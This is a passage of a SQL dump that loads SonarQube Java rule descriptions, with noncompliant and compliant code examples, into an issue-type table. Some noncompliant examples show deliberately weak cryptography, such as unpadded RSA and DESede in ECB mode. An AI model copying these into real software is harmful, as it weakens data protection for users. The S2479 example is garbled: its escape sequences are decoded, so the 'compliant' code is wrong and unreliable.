      monitor.wait(200);
    }
    process();
  }
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/YTdGBQ">CERT, LCK09-J.</a> - Do not perform operations that can block while holding a lock </li>
</ul>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2277', 'Cryptographic RSA algorithms should always incorporate OAEP (Optimal Asymmetric Encryption Padding)', 'sonarqube', 'Vulnerability', '<p>Without OAEP in RSA encryption, it takes less work for an attacker to decrypt the data or infer patterns from the ciphertext. This rule logs an
issue as soon as a literal value starts with <code>RSA/NONE</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
Cipher rsa = javax.crypto.Cipher.getInstance("RSA/NONE/NoPadding");
</pre>
<h2>Compliant Solution</h2>
<pre>
Cipher rsa = javax.crypto.Cipher.getInstance("RSA/ECB/OAEPWITHSHA-256ANDMGF1PADDING");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/780.html">MITRE CWE-780</a> - Use of RSA Algorithm without OAEP </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/327.html">MITRE CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#RSA_NO_PADDING">RSA NoPadding Unsafe</a> </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href=''/coding_rules#rule_key=java%3AS5542''>S5542</a> instead.</p>', 'java', 'DEPRECATED', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2278', 'Neither DES (Data Encryption Standard) nor DESede (3DES) should be used', 'sonarqube', 'Vulnerability', '<p>According to the US National Institute of Standards and Technology (NIST), the Data Encryption Standard (DES) is no longer considered secure:</p>
<blockquote>
  <p>Adopted in 1977 for federal agencies to use in protecting sensitive, unclassified information, the DES is being withdrawn because it no longer
  provides the security that is needed to protect federal government information.</p>
  <p>Federal agencies are encouraged to use the Advanced Encryption Standard, a faster and stronger algorithm approved as FIPS 197 in 2001.</p>
</blockquote>
<p>For similar reasons, RC2 should also be avoided.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Cipher c = Cipher.getInstance("DESede/ECB/PKCS5Padding");
</pre>
<h2>Compliant Solution</h2>
<pre>
Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/326.html">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/327.html">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#DES_USAGE">DES / DESede Unsafe</a> </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href=''/coding_rules#rule_key=java%3AS5547''>S5547</a> instead.</p>', 'java', 'DEPRECATED', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2293', 'The diamond operator ("<>") should be used', 'sonarqube', 'Code Smell', '<p>Java 7 introduced the diamond operator (<code>&lt;&gt;</code>) to reduce the verbosity of generics code. For instance, instead of having to declare
a <code>List</code>''s type in both its declaration and its constructor, you can now simplify the constructor declaration with <code>&lt;&gt;</code>,
and the compiler will infer the type.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>7</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
List&lt;String&gt; strings = new ArrayList&lt;String&gt;();  // Noncompliant
Map&lt;String,List&lt;Integer&gt;&gt; map = new HashMap&lt;String,List&lt;Integer&gt;&gt;();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
List&lt;String&gt; strings = new ArrayList&lt;&gt;();
Map&lt;String,List&lt;Integer&gt;&gt; map = new HashMap&lt;&gt;();
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2301', 'Public methods should not contain selector arguments', 'sonarqube', 'Code Smell', '<p>A selector argument is a <code>boolean</code> argument that''s used to determine which of two paths to take through a method. Specifying such a
parameter may seem innocuous, particularly if it''s well named. </p>
<p>Unfortunately, the maintainers of the code calling the method won''t see the parameter name, only its value. They''ll be forced either to guess at
the meaning or to take extra time to look the method up.</p>
<p>Instead, separate methods should be written.</p>
<p>This rule finds methods with a <code>boolean</code> that''s used to determine which path to take through the method.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public String tempt(String name, boolean ofAge) {
  if (ofAge) {
    offerLiquor(name);
  } else {
    offerCandy(name);
  }
}

// ...
public void corrupt() {
  tempt("Joe", false); // does this mean not to temp Joe?
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void temptAdult(String name) {
  offerLiquor(name);
}

public void temptChild(String name) {
    offerCandy(name);
}

// ...
public void corrupt() {
  age &lt; legalAge ? temptChild("Joe") : temptAdult("Joe");
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2308', '"deleteOnExit" should not be used', 'sonarqube', 'Code Smell', '<p>Use of <code>File.deleteOnExit()</code> is not recommended for the following reasons:</p>
<ul>
  <li> The deletion occurs only in the case of a normal JVM shutdown but not when the JVM crashes or is killed. </li>
  <li> For each file handler, the memory associated with the handler is released only at the end of the process. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
File file = new File("file.txt");
file.deleteOnExit();  // Noncompliant
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2309', 'Files should not be empty', 'sonarqube', 'Code Smell', '<p>Files with no lines of code clutter a project and should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
//package org.foo;
//
//public class Bar {}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2325', '"private" and "final" methods that don''t access instance data should be "static"', 'sonarqube', 'Code Smell', '<p>Non-overridable methods (<code>private</code> or <code>final</code>) that don''t access instance data can be <code>static</code> to prevent any
misunderstanding about the contract of the method.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Utilities {
  private static String magicWord = "magic";

  private String getMagicWord() { // Noncompliant
    return magicWord;
  }

  private void setMagicWord(String value) { // Noncompliant
    magicWord = value;
  }

}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Utilities {
  private static String magicWord = "magic";

  private static String getMagicWord() {
    return magicWord;
  }

  private static void setMagicWord(String value) {
    magicWord = value;
  }

}
</pre>
<h2>Exceptions</h2>
<p>When <code>java.io.Serializable</code> is implemented the following three methods are excluded by the rule:</p>
<ul>
  <li> <code>private void writeObject(java.io.ObjectOutputStream out) throws IOException;</code> </li>
  <li> <code>private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException;</code> </li>
  <li> <code>private void readObjectNoData() throws ObjectStreamException;</code> </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2326', 'Unused type parameters should be removed', 'sonarqube', 'Code Smell', '<p>Type parameters that aren''t used are dead code, which can only distract and possibly confuse developers during maintenance. Therefore, unused type
parameters should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int &lt;T&gt; Add(int a, int b) // Noncompliant; &lt;T&gt; is ignored
{
  return a + b;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int Add(int a, int b)
{
  return a + b;
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2333', 'Redundant modifiers should not be used', 'sonarqube', 'Code Smell', '<p>The methods declared in an <code>interface</code> are <code>public</code> and <code>abstract</code> by default. Any variables are automatically
<code>public static final</code>. Finally, <code>class</code> and <code>interface</code> are automatically <code>public static</code>. There is no
need to explicitly declare them so.</p>
<p>Since annotations are implicitly interfaces, the same holds true for them as well.</p>
<p>Similarly, the <code>final</code> modifier is redundant on any method of a <code>final</code> class, <code>private</code> is redundant on the
constructor of an <code>Enum</code>, and <code>static</code> is redundant for <code>interface</code> nested into a <code>class</code> or
<code>enum</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public interface Vehicle {

  public void go(int speed, Direction direction);  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface Vehicle {

  void go(int speed, Direction direction);
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2384', 'Mutable members should not be stored or returned directly', 'sonarqube', 'Code Smell', '<p>Mutable objects are those whose state can be changed. For instance, an array is mutable, but a String is not. Mutable class members should never be
returned to a caller or accepted and stored directly. Doing so leaves you vulnerable to unexpected changes in your class state.</p>
<p>Instead use an unmodifiable <code>Collection</code> (via <code>Collections.unmodifiableCollection</code>,
<code>Collections.unmodifiableList</code>, ...) or make a copy of the mutable object, and store or return the copy instead.</p>
<p>This rule checks that arrays, collections and Dates are not stored or returned directly.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class A {
  private String [] strings;

  public A () {
    strings = new String[]{"first", "second"};
  }

  public String [] getStrings() {
    return strings; // Noncompliant
  }

  public void setStrings(String [] strings) {
    this.strings = strings;  // Noncompliant
  }
}

public class B {

  private A a = new A();  // At this point a.strings = {"first", "second"};

  public void wreakHavoc() {
    a.getStrings()[0] = "yellow";  // a.strings = {"yellow", "second"};
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class A {
  private String [] strings;

  public A () {
    strings = new String[]{"first", "second"};
  }

  public String [] getStrings() {
    return strings.clone();
  }

  public void setStrings(String [] strings) {
    this.strings = strings.clone();
  }
}

public class B {

  private A a = new A();  // At this point a.strings = {"first", "second"};

  public void wreakHavoc() {
    a.getStrings()[0] = "yellow";  // a.strings = {"first", "second"};
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/374">MITRE, CWE-374</a> - Passing Mutable Objects to an Untrusted Method </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/375">MITRE, CWE-375</a> - Returning a Mutable Object to an Untrusted Caller </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/OTdGBQ">CERT, OBJ05-J.</a> - Do not return references to private mutable class members </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/HTdGBQ">CERT, OBJ06-J.</a> - Defensively copy mutable inputs and mutable internal components
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/VzZGBQ">CERT, OBJ13-J.</a> - Ensure that references to mutable objects are not exposed </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2386', 'Mutable fields should not be "public static"', 'sonarqube', 'Code Smell', '<p>There is no good reason to have a mutable object as the <code>public</code> (by default), <code>static</code> member of an <code>interface</code>.
Such variables should be moved into classes and their visibility lowered. </p>
<p>Similarly, mutable <code>static</code> members of classes and enumerations which are accessed directly, rather than through getters and setters,
should be protected to the degree possible. That can be done by reducing visibility or making the field <code>final</code> if appropriate. </p>
<p>Note that making a mutable field, such as an array, <code>final</code> will keep the variable from being reassigned, but doing so has no effect on
the mutability of the internal state of the array (i.e. it doesn''t accomplish the goal).</p>
<p>This rule raises issues for <code>public static</code> array, <code>Collection</code>, <code>Date</code>, and <code>awt.Point</code> members.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public interface MyInterface {
  public static String [] strings; // Noncompliant
}

public class A {
  public static String [] strings1 = {"first","second"};  // Noncompliant
  public static String [] strings2 = {"first","second"};  // Noncompliant
  public static List&lt;String&gt; strings3 = new ArrayList&lt;&gt;();  // Noncompliant
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/582.html">MITRE, CWE-582</a> - Array Declared Public, Final, and Static </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/607.html">MITRE, CWE-607</a> - Public Static Final Field References Mutable Object </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/LjdGBQ">CERT, OBJ01-J.</a> - Limit accessibility of fields </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/VzZGBQ">CERT, OBJ13-J.</a> - Ensure that references to mutable objects are not exposed </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2387', 'Child class fields should not shadow parent class fields', 'sonarqube', 'Code Smell', '<p>Having a variable with the same name in two unrelated classes is fine, but do the same thing within a class hierarchy and you''ll get confusion at
best, chaos at worst. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit {
  protected Season ripe;
  protected Color flesh;

  // ...
}

public class Raspberry extends Fruit {
  private boolean ripe;  // Noncompliant
  private static Color FLESH; // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Fruit {
  protected Season ripe;
  protected Color flesh;

  // ...
}

public class Raspberry extends Fruit {
  private boolean ripened;
  private static Color FLESH_COLOR;

}
</pre>
<h2>Exceptions</h2>
<p>This rule ignores same-name fields that are <code>static</code> in both the parent and child classes. This rule ignores <code>private</code> parent
class fields, but in all other such cases, the child class field should be renamed.</p>
<pre>
public class Fruit {
  private Season ripe;
  // ...
}

public class Raspberry extends Fruit {
  private Season ripe;  // Compliant as parent field ''ripe'' is anyway not visible from Raspberry
  // ...
}
</pre>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2388', 'Inner class calls to super class methods should be unambiguous', 'sonarqube', 'Code Smell', '<p>When an inner class extends another class, and both its outer class and its parent class have a method with the same name, calls to that method can
be confusing. The compiler will resolve the call to the superclass method, but maintainers may be confused, so the superclass method should be called
explicitly, using <code>super.</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Parent {
  public void foo() { ... }
}

public class Outer {

  public void foo() { ... }

  public class Inner extends Parent {

    public void doTheThing() {
      foo();  // Noncompliant; was Outer.this.foo() intended instead?
      // ...
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Parent {
  public void foo() { ... }
}

public class Outer {

  public void foo() { ... }

  public class Inner extends Parent {

    public void doTheThing() {
      super.foo();
      // ...
    }
  }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2390', 'Classes should not access their own subclasses during initialization', 'sonarqube', 'Code Smell', '<p>When a parent class references a member of a subclass during its own initialization, the results might not be what you expect because the child
class might not have been initialized yet. This could create what is known as an "initialisation cycle", or even a deadlock in some extreme cases.</p>
<p>To make things worse, these issues are very hard to diagnose so it is highly recommended you avoid creating this kind of dependencies.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Parent {
  static int field1 = Child.method(); // Noncompliant
  static int field2 = 42;

  public static void main(String[] args) {
    System.out.println(Parent.field1); // will display "0" instead of "42"
  }
}

class Child extends Parent {
  static int method() {
    return Parent.field2;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/display/java/DCL00-J.+Prevent+class+initialization+cycles">CERT, DCL00-J.</a> - Prevent
  class initialization cycles </li>
  <li> Java Language Specifications - <a href="https://docs.oracle.com/javase/specs/jls/se8/html/jls-12.html#jls-12.4">Section 12.4: Initialization of
  Classes and Interfaces</a> </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2391', 'JUnit framework methods should be declared properly', 'sonarqube', 'Code Smell', '<p>If the <code>suite</code> method in a JUnit 3 <code>TestCase</code> is not declared correctly, it will not be used. Such a method must be named
"suite", have no arguments, be <code>public static</code>, and must return either a <code>junit.framework.Test</code> or a
<code>junit.framework.TestSuite</code>.</p>
<p>Similarly, <code>setUp</code> and <code>tearDown</code> methods that aren''t properly capitalized will also be ignored.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Test suite() { ... } // Noncompliant; must be public static
public static boolean suite() { ... } // Noncompliant; wrong return type
public static Test suit() { ... } // Noncompliant; typo in method name
public static Test suite(int count) { ... } // Noncompliant; must be no-arg

public void setup() { ... } // Noncompliant; should be setUp
public void tearDwon() { ... } // Noncompliant; should be tearDown
</pre>
<h2>Compliant Solution</h2>
<pre>
public static Test suite() { ... }
public void setUp() { ... }
public void tearDown() { ... }
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>', 'java', 'DEPRECATED', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2437', 'Silly bit operations should not be performed', 'sonarqube', 'Code Smell', '<p>Certain bit operations are just silly and should not be performed because their results are predictable.</p>
<p>Specifically, using <code>&amp; -1</code> with any value will always result in the original value, as will <code>anyValue ^ 0</code> and
<code>anyValue | 0</code>.</p>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2438', '"Threads" should not be used where "Runnables" are expected', 'sonarqube', 'Code Smell', '<p>While it is technically correct to use a <code>Thread</code> where a <code>Runnable</code> is called for, the semantics of the two objects are
different, and mixing them is a bad practice that will likely lead to headaches in the future.</p>
<p>The crux of the issue is that <code>Thread</code> is a larger concept than <code>Runnable</code>. A <code>Runnable</code> is an object whose
running should be managed. A <code>Thread</code> expects to manage the running of itself or other <code>Runnables</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
	public static void main(String[] args) {
		Thread r =new Thread() {
			int p;
			@Override
			public void run() {
				while(true)
					System.out.println("a");
			}
		};
		new Thread(r).start();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
	public static void main(String[] args) {
		Runnable r =new Runnable() {
			int p;
			@Override
			public void run() {
				while(true)
					System.out.println("a");
			}
		};
		new Thread(r).start();
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2440', 'Classes with only "static" methods should not be instantiated', 'sonarqube', 'Code Smell', '<p><code>static</code> methods can be accessed without an instance of the enclosing class, so there''s no reason to instantiate a class that has only
<code>static</code> methods.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class TextUtils {
  public static String stripHtml(String source) {
    return source.replaceAll("&lt;[^&gt;]+&gt;", "");
  }
}

public class TextManipulator {

  // ...

  public void cleanText(String source) {
    TextUtils textUtils = new TextUtils(); // Noncompliant

    String stripped = textUtils.stripHtml(source);

    //...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class TextUtils {
  public static String stripHtml(String source) {
    return source.replaceAll("&lt;[^&gt;]+&gt;", "");
  }
}

public class TextManipulator {

  // ...

  public void cleanText(String source) {
    String stripped = TextUtils.stripHtml(source);

    //...
  }
}
</pre>
<h2>See Also</h2>
<ul>
  <li> <a href=''/coding_rules#rule_key=java%3AS1118''>S1118</a> - Utility classes should not have public constructors </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2441', 'Non-serializable objects should not be stored in "HttpSession" objects', 'sonarqube', 'Bug', '<p>If you have no intention of writting an <code>HttpSession</code> object to file, then storing non-<code>serializable</code> objects in it may not
seem like a big deal. But whether or not you explicitly serialize the session, it may be written to disk anyway, as the server manages its memory use
in a process called "passivation". Further, some servers automatically write their active sessions out to file at shutdown &amp; deserialize any such
sessions at startup.</p>
<p>The point is, that even though <code>HttpSession</code> does not <code>extend Serializable</code>, you must nonetheless assume that it will be
serialized, and understand that if you''ve stored non-serializable objects in the session, errors will result. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Address {
  //...
}

//...
HttpSession session = request.getSession();
session.setAttribute("address", new Address());  // Noncompliant; Address isn''t serializable
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/579.html">MITRE, CWE-579</a> - J2EE Bad Practices: Non-serializable Object Stored in Session
  </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2442', '"Lock" objects should not be "synchronized"', 'sonarqube', 'Code Smell', '<p><code>java.util.concurrent.locks.Lock</code> offers far more powerful and flexible locking operations than are available with
<code>synchronized</code> blocks. So synchronizing on a <code>Lock</code> throws away the power of the object, and is just silly. Instead, such
objects should be locked and unlocked using <code>tryLock()</code> and <code>unlock()</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Lock lock = new MyLockImpl();
synchronized(lock) {  // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
Lock lock = new MyLockImpl();
lock.tryLock();
//...
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/qjdGBQ">CERT, LCK03-J.</a> - Do not synchronize on the intrinsic locks of high-level concurrency
  objects </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2444', 'Lazy initialization of "static" fields should be "synchronized"', 'sonarqube', 'Code Smell', '<p>In a multi-threaded situation, un-<code>synchronized</code> lazy initialization of static fields could mean that a second thread has access to a
half-initialized object while the first thread is still creating it. Allowing such access could cause serious bugs. Instead. the initialization block
should be <code>synchronized</code>.</p>
<p>Similarly, updates of such fields should also be <code>synchronized</code>.</p>
<p>This rule raises an issue whenever a lazy static initialization is done on a class with at least one <code>synchronized</code> method, indicating
intended usage in multi-threaded applications.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private static Properties fPreferences = null;

private static Properties getPreferences() {
        if (fPreferences == null) {
            fPreferences = new Properties(); // Noncompliant
            fPreferences.put("loading", "true");
            fPreferences.put("filterstack", "true");
            readPreferences();
        }
        return fPreferences;
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private static Properties fPreferences = null;

private static synchronized Properties getPreferences() {
        if (fPreferences == null) {
            fPreferences = new Properties();
            fPreferences.put("loading", "true");
            fPreferences.put("filterstack", "true");
            readPreferences();
        }
        return fPreferences;
    }
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2445', 'Blocks should be synchronized on "private final" fields', 'sonarqube', 'Bug', '<p>Synchronizing on a class field synchronizes not on the field itself, but on the object assigned to it. So synchronizing on a non-<code>final</code>
field makes it possible for the field''s value to change while a thread is in a block synchronized on the old value. That would allow a second thread,
synchronized on the new value, to enter the block at the same time.</p>
<p>The story is very similar for synchronizing on parameters; two different threads running the method in parallel could pass two different object
instances in to the method as parameters, completely undermining the synchronization.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private String color = "red";

private void doSomething(){
  synchronized(color) {  // Noncompliant; lock is actually on object instance "red" referred to by the color variable
    //...
    color = "green"; // other threads now allowed into this block
    // ...
  }
  synchronized(new Object()) { // Noncompliant this is a no-op.
     // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private String color = "red";
private final Object lockObj = new Object();

private void doSomething(){
  synchronized(lockObj) {
    //...
    color = "green";
    // ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/412.html">MITRE, CWE-412</a> - Unrestricted Externally Accessible Lock </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/413">MITRE, CWE-413</a> - Improper Resource Locking </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/djdGBQ">CERT, LCK00-J.</a> - Use private final lock objects to synchronize classes that may
  interact with untrusted code </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2446', '"notifyAll" should be used', 'sonarqube', 'Bug', '<p><code>notify</code> and <code>notifyAll</code> both wake up sleeping threads, but <code>notify</code> only rouses one, while <code>notifyAll</code>
rouses all of them. Since <code>notify</code> might not wake up the right thread, <code>notifyAll</code> should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyThread extends Thread{

  @Override
  public void run(){
    synchronized(this){
      // ...
      notify();  // Noncompliant
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyThread extends Thread{

  @Override
  public void run(){
    synchronized(this){
      // ...
      notifyAll();
    }
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/MTdGBQ">CERT, THI02-J.</a> - Notify all waiting threads rather than a single thread </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2447', 'Null should not be returned from a "Boolean" method', 'sonarqube', 'Code Smell', '<p>While <code>null</code> is technically a valid <code>Boolean</code> value, that fact, and the distinction between <code>Boolean</code> and
<code>boolean</code> is easy to forget. So returning <code>null</code> from a <code>Boolean</code> method is likely to cause problems with callers''
code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public Boolean isUsable() {
  // ...
  return null;  // Noncompliant
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/476.html">MITRE CWE-476</a> - NULL Pointer Dereference </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/aDdGBQ">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2479', 'Whitespace and control characters in literals should be explicit', 'sonarqube', 'Code Smell', '<p>Non-encoded control characters and whitespace characters are often injected in the source code because of a bad manipulation. They are either
invisible or difficult to recognize, which can result in bugs when the string is not what the developer expects. If you actually need to use a control
character use their encoded version (ex: ASCII <code>
,	,</code>... or Unicode <code>U+000D, U+0009,</code>...).</p>
<p>This rule raises an issue when the following characters are seen in a literal string:</p>
<ul>
  <li> <a href="https://en.wikipedia.org/wiki/ASCII#Control_characters">ASCII control character</a>. (character index &lt; 32 or = 127) </li>
  <li> Unicode <a href="https://en.wikipedia.org/wiki/Unicode_character_property#Whitespace">whitespace characters</a>. </li>
  <li> Unicode <a href="https://en.wikipedia.org/wiki/C0_and_C1_control_codes">C0 control characters</a> </li>
  <li> Unicode characters <code>U+200B, U+200C, U+200D, U+2060, U+FEFF, U+2028, U+2029</code> </li>
</ul>
<p>No issue will be raised on the simple space character. Unicode <code>U+0020</code>, ASCII 32.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String tabInside = "A	B";  // Noncompliant, contains a tabulation
String zeroWidthSpaceInside = "foo​bar"; // Noncompliant, it contains a U+200B character inside
char tab = ''	'';
</pre>
<h2>Compliant Solution</h2>
<pre>
String tabInside = "A	B";  // Compliant, uses escaped value
String zeroWidthSpaceInside = "fooar";  // Compliant, uses escaped value
char tab = ''	'';
</pre>
<h2>Exceptions</h2>
<p>Text Blocks string literals (java 13 three double-quote marks) can contain tabulations to allow indentation using tabulations.</p>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2583', 'Conditionally executed code should be reachable', 'sonarqube', 'Bug', '<p>Conditional expressions which are always <code>true</code> or <code>false</code> can lead to dead code. Such code is always buggy and should never
be used in production.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = false;
if (a) { // Noncompliant
  doSomething(); // never executed
}

if (!a || b) { // Noncompliant; "!a" is always "true", "b" is never evaluated
  doSomething();
} else {
  doSomethingElse(); // never executed
}
</pre>
<h2>Exceptions</h2>
<p>This rule will not raise an issue in either of these cases:</p>
<ul>
  <li> When the condition is a single <code>final boolean</code> </li>
</ul>
<pre>
final boolean debug = false;
//...
if (debug) {
